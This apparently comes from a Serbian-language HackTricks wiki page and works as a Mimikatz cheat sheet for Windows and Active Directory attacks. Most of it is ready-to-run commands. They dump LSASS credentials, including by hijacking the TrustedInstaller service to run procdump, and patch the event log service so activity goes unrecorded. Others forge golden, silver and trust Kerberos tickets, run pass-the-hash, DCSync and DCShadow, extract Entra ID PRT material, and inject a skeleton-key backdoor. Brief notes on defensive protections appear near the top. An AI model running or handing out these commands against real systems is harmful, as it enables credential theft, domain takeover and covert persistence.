# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Ova stranica je zasnovana na stranici sa [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Pogledajte original za dodatne informacije!<sup>[[3]](#references)</sup>

## LM i Clear-Text u memoriji

Od Windows 8.1 i Windows Server 2012 R2, uvedene su značajne mere za zaštitu od krađe credentials:

- **LM hashes i plain-text passwords** se više ne čuvaju u memoriji radi poboljšanja bezbednosti. Određena registry postavka, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ mora biti konfigurisana sa DWORD vrednošću `0` kako bi se onemogućila Digest Authentication, čime se osigurava da se "clear-text" passwords ne keširaju u LSASS-u.

- **LSA Protection** je uveden radi zaštite procesa Local Security Authority (LSA) od neovlašćenog čitanja memorije i code injection-a. To se postiže označavanjem LSASS-a kao protected process. Aktiviranje LSA Protection-a obuhvata:
1. Izmenu registry-ja na _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ postavljanjem vrednosti `RunAsPPL` na `dword:00000001`.
2. Implementaciju Group Policy Object-a (GPO) koji nameće ovu promenu registry-ja na svim upravljanim uređajima.

Uprkos ovim zaštitama, alati poput Mimikatz-a mogu zaobići LSA Protection korišćenjem specifičnih driver-a, iako će takve radnje verovatno biti zabeležene u event logovima.

Na modernim workstation-ima ovo je još važnije jer je **Credential Guard podrazumevano omogućen na mnogim Windows 11 22H2+ i Windows Server 2025 sistemima pridruženim domenu, koji nisu DC sistemi**, dok je **LSASS-as-PPL podrazumevano omogućen na novim Windows 11 22H2+ instalacijama**. U praksi to znači da `sekurlsa::logonpasswords` često daje manje materijala nego što se očekivalo na osnovu starijih tradecraft tehnika, pa operatori sve češće prelaze na **offline minidumps**, **Kerberos key extraction (`sekurlsa::ekeys`)** ili module usmerene na **CloudAP/PRT**. Za informacije o zaštiti pogledajte [Windows credentials protections](credentials-protections.md).

### Suprotstavljanje uklanjanju SeDebugPrivilege-a

Administratori obično imaju SeDebugPrivilege, koji im omogućava debug-ovanje programa. Ova privilegija može biti ograničena kako bi se sprečili neovlašćeni memory dumps, što je uobičajena tehnika koju napadači koriste za izvlačenje credentials iz memorije. Međutim, čak i kada je ova privilegija uklonjena, TrustedInstaller account i dalje može da izvršava memory dumps korišćenjem prilagođene service konfiguracije:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Ovo omogućava dumpovanje memorije procesa `lsass.exe` u datoteku, koja se zatim može analizirati na drugom sistemu radi izvlačenja akreditiva:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz opcije

Manipulacija event logovima u Mimikatz-u obuhvata dve primarne radnje: brisanje event logova i patch-ovanje Event servisa kako bi se sprečilo logovanje novih eventova. U nastavku su navedene komande za izvršavanje ovih radnji:

#### Brisanje event logova

- **Komanda**: Ova radnja ima za cilj brisanje event logova, čime se otežava praćenje malicioznih aktivnosti.
- Mimikatz ne obezbeđuje direktnu komandu u svojoj standardnoj dokumentaciji za direktno brisanje event logova putem komandne linije. Međutim, manipulacija event logovima obično podrazumeva korišćenje sistemskih alata ili skripti izvan Mimikatz-a za brisanje određenih logova (npr. korišćenjem PowerShell-a ili Windows Event Viewer-a).

#### Eksperimentalna funkcija: Patch-ovanje Event servisa

- **Komanda**: `event::drop`
- Ova eksperimentalna komanda je namenjena izmeni ponašanja Event Logging Service-a, čime se efektivno sprečava beleženje novih eventova.
- Primer: `mimikatz "privilege::debug" "event::drop" exit`

- Komanda `privilege::debug` obezbeđuje da Mimikatz radi sa neophodnim privilegijama za izmenu sistemskih servisa.
- Komanda `event::drop` zatim patch-uje Event Logging servis.

### Kerberos Ticket napadi

Koristite komande u nastavku kao brzi podsetnik na sintaksu. Posebne stranice za [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md) i [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) sadrže aktuelne AES/PAC/opsec nijanse.

### Kreiranje Golden Ticket-a

Golden Ticket omogućava impersonaciju sa pristupom na nivou celog domena. Ključna komanda i parametri:

- Komanda: `kerberos::golden`
- Parametri:
- `/domain`: Naziv domena.
- `/sid`: Security Identifier (SID) domena.
- `/user`: Korisničko ime za impersonaciju.
- `/krbtgt`: NTLM hash servisnog naloga KDC-a domena.
- `/ptt`: Direktno ubacuje ticket u memoriju.
- `/ticket`: Čuva ticket za kasniju upotrebu.

Primer:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Silver Tickets omogućavaju pristup određenim servisima. Ključna komanda i parametri:

- Komanda: Slično kao kod Golden Ticket-a, ali cilja određene servise.
- Parametri:
- `/service`: Servis koji treba ciljati (npr. cifs, http).
- Ostali parametri slični kao kod Golden Ticket-a.

Primer:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Kreiranje Trust Ticket-a

Trust Tickets se koriste za pristup resursima širom domena korišćenjem trust odnosa. Ključna komanda i parametri:

- Komanda: Slično kao Golden Ticket, ali za trust odnose.
- Parametri:
- `/target`: FQDN ciljnog domena.
- `/rc4`: NTLM hash za trust nalog.

Primer:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Dodatne Kerberos komande

- **Listing Tickets**:

- Command: `kerberos::list`
- Izlistava sve Kerberos tikete za trenutnu sesiju korisnika.

- **Pass the Cache**:

- Command: `kerberos::ptc`
- Ubacuje Kerberos tikete iz cache datoteka.
- Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Command: `kerberos::ptt`
- Omogućava korišćenje Kerberos tiketa u drugoj sesiji.
- Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets**:
- Command: `kerberos::purge`
- Uklanja sve Kerberos tikete iz sesije.
- Korisno je pre korišćenja komandi za manipulaciju tiketima kako bi se izbegli konflikti.

### Over-Pass-the-Hash / Pass-the-Key

Ako je `RC4` onemogućen ili nepouzdan, Mimikatz može da ubaci **AES128/AES256 Kerberos ključeve** u trenutnu logon sesiju, umesto da koristi samo NT hash. Ovo obično bolje odgovara modernim domenima nego tretiranje `sekurlsa::pth` kao isključivo NTLM metode.<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` ponovo koristi trenutni proces umesto pokretanja nove konzole, što je korisno kada želite da odmah pokrenete stvari kao što je `lsadump::dcsync` u istom kontekstu.

### Menjanje Active Directory-ja

- **DCShadow**: Privremeno pretvara mašinu u DC radi manipulacije AD objektima. Pogledajte [DCShadow](../active-directory-methodology/dcshadow.md).

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Oponaša DC radi zahtevanja podataka o lozinkama. Pogledajte [DCSync](../active-directory-methodology/dcsync.md).
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Pristup credentialima

- **LSADUMP::LSA**: Izvlači credentials iz LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Oponaša DC koristeći podatke o lozinki computer naloga.

- _U originalnom kontekstu nije navedena konkretna komanda za NetSync._

- **LSADUMP::SAM**: Pristupa lokalnoj SAM bazi podataka.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Dešifruje secrets sačuvane u registru.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Postavlja novi NTLM hash za korisnika.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Preuzima informacije o autentikaciji trust-a.
- `mimikatz "lsadump::trust" exit`

### Cloud credentials / Entra ID

Na hostovima sa **Entra ID** ili **hybrid-joined** statusom, `sekurlsa::cloudap` može da otkrije keširani materijal **Primary Refresh Token (PRT)** iz LSASS-a. Ako je pridruženi Proof-of-Possession ključ zaštićen softverom, `dpapi::cloudapkd` može da izvede jasan/izvedeni materijal ključa potreban za naknadne **Pass-the-PRT** workflow-e.<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
Ovo postaje mnogo teže kada je ključ podržan TPM-om, ali vredi proveriti hybrid endpoints jer keširani CloudAP podaci mogu biti zanimljiviji od klasičnog `wdigest` output-a.<sup>[[2]](#references)</sup> Za cloud-side abuse chain pogledajte [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).

### Razno

- **MISC::Skeleton**: Inject backdoor u LSASS na DC-u.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Eskalacija privilegija

- **PRIVILEGE::Backup**: Dobijanje backup prava.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Dobijanje debug privilegija.
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: Prikaz kredencijala za prijavljene korisnike.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Extract Kerberos ticket-a iz memorije.
- `mimikatz "sekurlsa::tickets /export" exit`

### Manipulacija SID-om i tokenima

- **SID::add/modify**: Promena SID-a i SIDHistory-ja.

- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: _U originalnom kontekstu nije navedena posebna komanda za modify._

- **TOKEN::Elevate**: Impersonate token-a.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Omogućavanje više RDP sesija.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Izlistavanje TS/RDP sesija.
- _U originalnom kontekstu nije navedena posebna komanda za TS::Sessions._

### Vault

- Extract password-a iz Windows Vault-a.
- `mimikatz "vault::cred /patch" exit`


## Reference

- [1] [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Mimikatz command reference](https://adsecurity.org/?page_id=1821)

{{#include ../../banners/hacktricks-training.md}}
